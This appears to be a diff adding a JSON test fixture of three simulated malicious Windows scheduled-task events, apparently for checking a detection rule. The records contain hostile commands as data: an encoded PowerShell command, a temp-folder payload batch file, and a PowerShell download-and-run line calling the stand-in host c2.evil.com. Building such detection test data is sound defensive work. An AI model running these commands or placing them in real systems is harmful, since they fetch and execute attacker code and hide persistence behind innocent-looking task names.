@@ -1,0 +1,32 @@
+[
+  {
+    "id": "stc_mal_001",
+    "TimeGenerated": "2024-01-15T15:00:00Z",
+    "Computer": "WORKSTATION-01",
+    "SubjectUserName": "jdoe",
+    "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
+    "TaskContent": "<Actions><Exec><Command>powershell.exe</Command><Arguments>-EncodedCommand SQBFAFgA</Arguments></Exec></Actions>",
+    "UsesSuspiciousPath": false,
+    "UsesLolbas": true
+  },
+  {
+    "id": "stc_mal_002",
+    "TimeGenerated": "2024-01-15T15:05:00Z",
+    "Computer": "WORKSTATION-02",
+    "SubjectUserName": "jsmith",
+    "TaskName": "\\SystemMaintenance",
+    "TaskContent": "<Actions><Exec><Command>cmd.exe</Command><Arguments>/c C:\\appdata\\local\\temp\\payload.bat</Arguments></Exec></Actions>",
+    "UsesSuspiciousPath": true,
+    "UsesLolbas": true
+  },
+  {
+    "id": "stc_mal_003",
+    "TimeGenerated": "2024-01-15T15:10:00Z",
+    "Computer": "SERVER-01",
+    "SubjectUserName": "administrator",
+    "TaskName": "\\Security\\Audit",
+    "TaskContent": "<Actions><Exec><Command>powershell.exe</Command><Arguments>IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com')</Arguments></Exec></Actions>",
+    "UsesSuspiciousPath": false,
+    "UsesLolbas": true
+  }
+]
